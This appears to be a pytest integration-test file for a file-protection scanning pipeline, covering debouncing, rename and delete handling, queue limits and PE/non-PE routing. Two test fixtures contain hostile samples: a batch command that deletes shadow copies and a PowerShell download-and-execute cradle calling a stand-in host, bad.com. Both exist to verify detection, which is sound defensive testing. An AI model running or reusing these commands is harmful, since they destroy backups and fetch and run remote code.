"""
ACTIS Day 20 Integration Tests: Week 5 Integration Audit & Pipeline Hardening
Covers edge cases, filesystem race conditions, debounce coalescing, directory events,
renamed path pruning, queue bounds, and PE/non-PE fallback routing.
"""

import time
import zipfile
from pathlib import Path
from typing import Any, Dict, List

import pytest

from scanners.file_scanner import scan_file
from scanners.file_feature_extractor import FileFeatureExtractor, DOS_SIGNATURE
from scanners.file_watcher import wait_until_file_stable, FilesystemEvent
from service.events import SecurityEvent, SecurityEventType, SecurityEventQueue
from service.debouncer import FileEventDebouncer
from service.file_filter import FileEventFilter, FileFilterPolicy, FilterReason
from service.file_normalizer import FilesystemEventNormalizer, NormalizedFileEvent
from service.file_pipeline import (
    FileProtectionPipeline,
    EventProcessingStatus,
    EventProcessingResult,
)
from service.protection_service import ProtectionService
from service.config import ServiceConfig
from scanners.incremental_state import IncrementalStateManager, FileChangeType
from tests.test_static_pe import create_minimal_synthetic_pe


class TestFileEventLifecycleAndDebouncing:
    """Verifies event lifecycle hardening, debouncing, file stabilization, and error recovery."""

    def test_rapid_modifications_coalesced_by_debouncer(self, tmp_path):
        """Case 1: A file created and modified multiple times rapidly is coalesced into one event."""
        target_file = tmp_path / "burst_write.txt"
        target_file.write_text("initial", encoding="utf-8")

        emitted: List[NormalizedFileEvent] = []
        debouncer = FileEventDebouncer(
            debounce_seconds=0.1,
            stability_check=False,
            on_stable_event=lambda ev: emitted.append(ev),
        )
        debouncer.start()

        try:
            # Emit rapid succession of events for the same path
            ev_create = NormalizedFileEvent(
                event_type=SecurityEventType.FILE_CREATED,
                path=str(target_file),
            )
            debouncer.submit(ev_create)

            for i in range(5):
                target_file.write_text(f"chunk_{i}", encoding="utf-8")
                ev_mod = NormalizedFileEvent(
                    event_type=SecurityEventType.FILE_MODIFIED,
                    path=str(target_file),
                )
                debouncer.submit(ev_mod)

            # Wait for debounce window to settle
            time.sleep(0.3)

            assert len(emitted) == 1
            assert emitted[0].event_type == SecurityEventType.FILE_CREATED
            assert emitted[0].metadata["coalesced_event_count"] == 6
            assert debouncer.get_stats()["events_coalesced"] >= 5
        finally:
            debouncer.stop()

    def test_file_stability_check_helper(self, tmp_path):
        """Case 2: Verifies wait_until_file_stable with regular, empty, and nonexistent files."""
        # A. Normal written file
        normal_file = tmp_path / "normal.dat"
        normal_file.write_bytes(b"content" * 100)
        assert wait_until_file_stable(normal_file, timeout=0.5, check_interval=0.05) is True

        # B. 0-byte empty file (must stabilize cleanly without timing out)
        empty_file = tmp_path / "zero_bytes.dat"
        empty_file.write_bytes(b"")
        assert wait_until_file_stable(empty_file, timeout=0.5, check_interval=0.05) is True

        # C. Nonexistent file
        missing_file = tmp_path / "nonexistent.dat"
        assert wait_until_file_stable(missing_file, timeout=0.2, check_interval=0.05) is False

    def test_duplicate_events_for_same_path_deduplicated_by_state(self, tmp_path):
        """Case 3: Duplicate events for unchanged files reuse scan state and skip deep analysis."""
        state_mgr = IncrementalStateManager(auto_load=False)
        pipeline = FileProtectionPipeline(state_manager=state_mgr)

        sample_file = tmp_path / "duplicate_target.ps1"
        sample_file.write_text("Write-Output 'Hello World'", encoding="utf-8")

        ev1 = SecurityEvent(
            event_type=SecurityEventType.FILE_CREATED,
            source="test_watcher",
            target=str(sample_file),
        )
        res1 = pipeline.process_file_event(ev1)
        assert res1.status == EventProcessingStatus.ANALYZED
        assert res1.change_type == FileChangeType.NEW_FILE

        # Resubmit exact same file event
        ev2 = SecurityEvent(
            event_type=SecurityEventType.FILE_MODIFIED,
            source="test_watcher",
            target=str(sample_file),
        )
        res2 = pipeline.process_file_event(ev2)
        assert res2.status == EventProcessingStatus.UNCHANGED
        assert res2.change_type == FileChangeType.UNCHANGED_FILE
        assert pipeline.get_stats()["unchanged_count"] == 1

    def test_pipeline_handles_disappeared_file_cleanly(self, tmp_path):
        """Case 4: File that disappears before analysis starts returns DISAPPEARED."""
        state_mgr = IncrementalStateManager(auto_load=False)
        pipeline = FileProtectionPipeline(state_manager=state_mgr)

        ghost_path = tmp_path / "ghost_file.exe"
        ev = SecurityEvent(
            event_type=SecurityEventType.FILE_CREATED,
            source="test_watcher",
            target=str(ghost_path),
        )
        res = pipeline.process_file_event(ev)
        assert res.status == EventProcessingStatus.DISAPPEARED
        assert res.change_type == FileChangeType.UNAVAILABLE_FILE
        assert pipeline.get_stats()["disappeared_count"] == 1

    def test_pipeline_handles_file_renamed_and_prunes_old_path(self, tmp_path):
        """Case 5: File renamed while queued prunes the previous path from state."""
        state_mgr = IncrementalStateManager(auto_load=False)
        pipeline = FileProtectionPipeline(state_manager=state_mgr)

        old_file = tmp_path / "original_name.bat"
        old_file.write_text("@echo off\r\necho running\r\n", encoding="utf-8")

        # Ingest original file
        ev1 = SecurityEvent(
            event_type=SecurityEventType.FILE_CREATED,
            source="test_watcher",
            target=str(old_file),
        )
        pipeline.process_file_event(ev1)
        old_canonical = str(old_file.resolve())
        assert state_mgr.get_state(old_canonical) is not None

        # Rename file on disk
        new_file = tmp_path / "renamed_name.bat"
        old_file.rename(new_file)

        # Ingest rename event with previous_path in metadata
        rename_event = SecurityEvent(
            event_type=SecurityEventType.FILE_RENAMED,
            source="test_watcher",
            target=str(new_file),
            metadata={"previous_path": old_canonical},
        )
        res2 = pipeline.process_file_event(rename_event)

        assert res2.status == EventProcessingStatus.ANALYZED
        # Verify old path was pruned from state
        assert state_mgr.get_state(old_canonical) is None
        # Verify new path is tracked
        assert state_mgr.get_state(str(new_file.resolve())) is not None

    def test_pipeline_handles_file_deletion_and_state_removal(self, tmp_path):
        """Case 6: File deleted before pipeline reads it removes state and returns DELETED."""
        state_mgr = IncrementalStateManager(auto_load=False)
        pipeline = FileProtectionPipeline(state_manager=state_mgr)

        del_file = tmp_path / "to_delete.txt"
        del_file.write_text("temporary data", encoding="utf-8")

        ev_create = SecurityEvent(
            event_type=SecurityEventType.FILE_CREATED,
            source="test_watcher",
            target=str(del_file),
        )
        pipeline.process_file_event(ev_create)
        canonical = str(del_file.resolve())
        assert state_mgr.get_state(canonical) is not None

        # Delete from disk
        del_file.unlink()

        ev_del = SecurityEvent(
            event_type=SecurityEventType.FILE_DELETED,
            source="test_watcher",
            target=str(del_file),
        )
        res = pipeline.process_file_event(ev_del)
        assert res.status == EventProcessingStatus.DELETED
        assert res.change_type == FileChangeType.REMOVED_FILE
        assert state_mgr.get_state(canonical) is None

    def test_directory_event_mistakenly_presented_as_file(self, tmp_path):
        """Case 7: A directory path passed as a file event is safely skipped as unsupported."""
        state_mgr = IncrementalStateManager(auto_load=False)
        pipeline = FileProtectionPipeline(state_manager=state_mgr)

        sub_dir = tmp_path / "accidental_folder"
        sub_dir.mkdir()

        ev = SecurityEvent(
            event_type=SecurityEventType.FILE_CREATED,
            source="test_watcher",
            target=str(sub_dir),
        )
        res = pipeline.process_file_event(ev)

        assert res.status == EventProcessingStatus.SKIPPED_UNSUPPORTED
        assert "directory" in res.error_message.lower()
        assert pipeline.get_stats()["unsupported_count"] == 1

    def test_temporary_files_filtered_before_pipeline(self, tmp_path):
        """Case 8: Ephemeral swap and lock files are discarded by FileEventFilter."""
        file_filter = FileEventFilter(policy=FileFilterPolicy(filter_temporary_files=True))

        temp_cases = [
            ("file.tmp", False, FilterReason.TEMPORARY_FILE),
            ("~$document.docx", False, FilterReason.TEMPORARY_FILE),
            ("archive.crdownload", False, FilterReason.TEMPORARY_FILE),
            (".script.swp", False, FilterReason.TEMPORARY_FILE),
            ("legit_script.ps1", True, FilterReason.ACCEPTED),
        ]

        for fname, expected_allowed, expected_reason in temp_cases:
            ev = NormalizedFileEvent(
                event_type=SecurityEventType.FILE_CREATED,
                path=str(tmp_path / fname),
            )
            is_allowed, reason = file_filter.filter_event(ev)
            assert is_allowed is expected_allowed
            assert reason == expected_reason


class TestQueueSchedulingAndWorkerSafety:
    """Verifies bounded queue capacity, backpressure, and worker cancellation."""

    def test_bounded_queue_saturation_drops_cleanly(self):
        """Verifies that an intake queue at capacity drops excess events cleanly without crashing."""
        q = SecurityEventQueue(maxsize=15)

        # Enqueue up to capacity
        for i in range(15):
            ev = SecurityEvent(
                event_type=SecurityEventType.FILE_CREATED,
                source="queue_test",
                target=f"C:\\test\\file_{i}.txt",
            )
            assert q.put(ev, block=False) is True

        assert q.is_full() is True

        # Enqueue 5 overflow events
        overflow_ev = SecurityEvent(
            event_type=SecurityEventType.FILE_CREATED,
            source="queue_test",
            target="C:\\test\\overflow.txt",
        )
        for _ in range(5):
            success = q.put(overflow_ev, block=False)
            assert success is False

        stats = q.get_stats()
        assert stats["enqueued_count"] == 15
        assert stats["dropped_count"] == 5

    def test_worker_pool_clean_shutdown_during_pending_work(self):
        """Verifies that ProtectionService workers terminate cleanly during pending work."""
        cfg = ServiceConfig(
            service_name="TestShutdownSafety",
            worker_count=2,
            queue_max_size=50,
            shutdown_timeout_seconds=1.5,
        )
        service = ProtectionService(config=cfg)
        assert service.start() is True

        # Enqueue events
        for i in range(10):
            ev = SecurityEvent(
                event_type=SecurityEventType.FILE_CREATED,
                source="test_worker_shutdown",
                target=f"C:\\test\\pending_{i}.txt",
            )
            service.submit_event(ev)

        # Stop service cleanly
        assert service.stop(timeout=1.0) is True
        assert service.is_running() is False
        assert service.worker_manager.active_count() == 0

    def test_analyzer_exception_isolated_in_pipeline(self, tmp_path):
        """Verifies that an unexpected exception in analysis_fn does not crash the pipeline."""
        state_mgr = IncrementalStateManager(auto_load=False)

        def failing_analyzer(path: Path) -> Dict[str, Any]:
            raise RuntimeError("Synthetic parser crash simulation")

        pipeline = FileProtectionPipeline(
            state_manager=state_mgr,
            analysis_fn=failing_analyzer,
        )

        test_file = tmp_path / "test_error.txt"
        test_file.write_text("content", encoding="utf-8")

        ev = SecurityEvent(
            event_type=SecurityEventType.FILE_CREATED,
            source="test_watcher",
            target=str(test_file),
        )
        res = pipeline.process_file_event(ev)
        assert res.status == EventProcessingStatus.ERROR
        assert "Synthetic parser crash simulation" in res.error_message
        assert pipeline.get_stats()["error_count"] == 1


class TestEndToEndPERoutingAndEvidenceConsistency:
    """Tests end-to-end routing between PE and non-PE analyzers and evidence consistency."""

    def test_routing_valid_pe_uses_pe_parser(self, tmp_path):
        pe_file = tmp_path / "valid.exe"
        pe_file.write_bytes(create_minimal_synthetic_pe())

        res = scan_file(pe_file)
        assert res["is_pe"] is True
        assert res["detected_format"] == "WINDOWS_PE"
        assert res["analysis_method"] == "STATIC_PE_PARSER"
        assert res["sha256"] != ""

    def test_routing_corrupt_pe_header_falls_back_to_non_pe(self, tmp_path):
        corrupt_pe = tmp_path / "corrupt_pe.exe"
        raw_pe = bytearray(create_minimal_synthetic_pe())
        raw_pe[0x80:0x84] = b"BADP"  # Corrupt PE signature
        corrupt_pe.write_bytes(bytes(raw_pe))

        res = scan_file(corrupt_pe)
        assert res["is_pe"] is False
        assert res["detected_format"] == "GENERIC_BINARY"
        assert res["analysis_method"] == "GENERIC_METADATA_ONLY"
        assert res["sha256"] != ""

    def test_routing_script_disguised_as_exe_detected_via_content(self, tmp_path):
        disguised = tmp_path / "payload.exe"
        disguised.write_text("@echo off\r\nvssadmin delete shadows /all /quiet\r\n", encoding="utf-8")

        res = scan_file(disguised)
        assert res["is_pe"] is False
        assert res["detected_format"] == "SCRIPT_BATCH"
        assert res["analysis_method"] == "SCRIPT_STATIC_HEURISTICS"
        assert res["is_threat"] is True
        assert "RULE_SCRIPT_SHADOW_COPY_DELETION" in res["heuristic_result"]["rules_triggered"]

    def test_routing_empty_file_has_valid_hashes_and_generic_method(self, tmp_path):
        empty_file = tmp_path / "zero.exe"
        empty_file.write_bytes(b"")

        res = scan_file(empty_file)
        assert res["is_pe"] is False
        assert res["detected_format"] == "EMPTY_FILE"
        assert res["analysis_method"] == "GENERIC_METADATA_ONLY"
        # Deterministic SHA-256 for empty file
        assert res["sha256"] == "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"

    def test_routing_unsupported_7z_reports_honestly(self, tmp_path):
        archive_7z = tmp_path / "container.7z"
        archive_7z.write_bytes(b"7z\xbc\xaf\x27\x1c\x00\x00synthetic_7z")

        res = scan_file(archive_7z)
        assert res["is_pe"] is False
        assert res["detected_format"] == "ARCHIVE_7Z"
        assert res["analysis_method"] == "FORMAT_UNSUPPORTED"
        assert res["sha256"] != ""

    def test_pipeline_dispatches_notification_for_malicious_script(self, tmp_path):
        """Verifies threat alert dispatch through FileProtectionPipeline for non-PE script."""
        state_mgr = IncrementalStateManager(auto_load=False)

        class MockNotifier:
            def __init__(self):
                self.notified_threats = []

            def notify_threat(self, **kwargs):
                self.notified_threats.append(kwargs)

        mock_notifier = MockNotifier()
        pipeline = FileProtectionPipeline(
            state_manager=state_mgr,
            notifier=mock_notifier,
        )

        bad_ps1 = tmp_path / "attack.ps1"
        bad_ps1.write_text(
            "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"(New-Object Net.WebClient).DownloadString('http://bad.com/stage2') | IEX\"\n",
            encoding="utf-8"
        )

        ev = SecurityEvent(
            event_type=SecurityEventType.FILE_CREATED,
            source="test_pipeline",
            target=str(bad_ps1),
        )
        res = pipeline.process_file_event(ev)

        assert res.status == EventProcessingStatus.ANALYZED
        assert res.is_threat is True
        assert res.risk_level in ("MEDIUM", "HIGH", "CRITICAL")
        assert len(mock_notifier.notified_threats) == 1
        alert = mock_notifier.notified_threats[0]
        assert alert["target_type"] == "file"
        assert alert["risk_level"] in ("MEDIUM", "HIGH", "CRITICAL")
